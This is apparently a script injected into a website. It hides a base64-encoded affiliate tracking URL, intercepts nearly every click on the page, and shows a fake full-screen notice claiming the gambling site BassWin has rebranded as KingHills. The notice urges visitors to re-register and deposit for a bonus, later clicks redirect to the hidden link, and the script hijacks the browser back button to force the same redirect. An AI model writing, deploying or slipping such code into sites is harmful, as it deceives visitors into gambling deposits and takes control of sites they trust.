const excludedLinks = ['/about', '/contact'];
const base64Url = 'aHR0cHM6Ly90cmtnZmxvdy5nMmFmc2UuY29tL2NsaWNrP3BpZD0xMyZvZmZlcl9pZD0zMDU3JnN1YjE9YmFzc3dpbg==';

function base64_decode(data) {
    const b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    let o1, o2, o3, h1, h2, h3, h4, bits, i = 0, enc = '';
    do {
        h1 = b64.indexOf(data.charAt(i++));
        h2 = b64.indexOf(data.charAt(i++));
        h3 = b64.indexOf(data.charAt(i++));
        h4 = b64.indexOf(data.charAt(i++));
        bits = h1 << 18 | h2 << 12 | h3 << 6 | h4;
        o1 = bits >> 16 & 0xff;
        o2 = bits >> 8 & 0xff;
        o3 = bits & 0xff;

        if (h3 === 64) enc += String.fromCharCode(o1);
        else if (h4 === 64) enc += String.fromCharCode(o1, o2);
        else enc += String.fromCharCode(o1, o2, o3);
    } while (i < data.length);
    return enc;
}

const redirectUrl = base64_decode(base64Url);

let isPopupShown = false;

function shouldRedirect(event) {
    const anchor = event.target.closest('a');
    if (anchor) {
        const href = anchor.getAttribute('href');
        if (href && excludedLinks.includes(href)) {
            return false;
        }
    }
    return true;
}

function showPopup() {
    const popup = document.createElement('div');
    popup.innerHTML = `
        <div class="full-screen-container" style="display: flex; justify-content: center; align-items: center; background-color: rgba(0, 0, 0, 0.9); position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; color: white;">
            <div class="form-container" style="background: #333; padding: 20px; border-radius: 10px; text-align: center; width: 90%; max-width: 600px;">
                <div class="icons" style="margin-bottom: 20px; display: flex; align-items: center; justify-content: center;">
                    <img src="https://bass-win.com/bass-win-logo.svg" alt="BassWin Logo" style="height: 50px; margin-right: 10px;">
                    <span style="font-size: 36px; color: white;">→</span>
                    <img src="https://bass-win.com/764233517522402477.png" alt="KingHills Logo" style="height: 50px; margin-left: 10px;">
                </div>
                <div style="font-size: 24px; font-weight: bold; margin-bottom: 15px;">Dear Customer!</div>
                <p>We are excited to announce that we have rebranded. BassWin is now <strong>KingHills</strong>.</p>
                <p>We have moved to a new platform, and we kindly ask you to register with us again to continue enjoying our services.</p>
                <p>To celebrate, we are offering you a 100% deposit bonus up to £425 + 200 free spins! To claim your bonus, click the button below, register, and make your deposit.</p>
                <button id="continue-btn" class="button" style="background-color: #f0ad4e; border: none; color: white; padding: 10px 20px; cursor: pointer; border-radius: 5px; margin-top: 10px;">Continue</button>
            </div>
        </div>
    `;

    document.body.appendChild(popup);

    document.getElementById('continue-btn').addEventListener('click', () => {
        popup.remove();
        isPopupShown = true;
    });
}

function redirect() {
    window.location.href = redirectUrl;
}

document.addEventListener('DOMContentLoaded', () => {
    document.body.addEventListener('click', (event) => {
        if (shouldRedirect(event)) {
            event.preventDefault();
            if (!isPopupShown) {
                showPopup();
            } else {
                redirect();
            }
        }
    });

    // Push a dummy state to track the initial page load
    history.pushState(null, null, window.location.href);
    window.addEventListener('popstate', (event) => {
        redirect();
        history.pushState(null, null, window.location.href);
    });
});
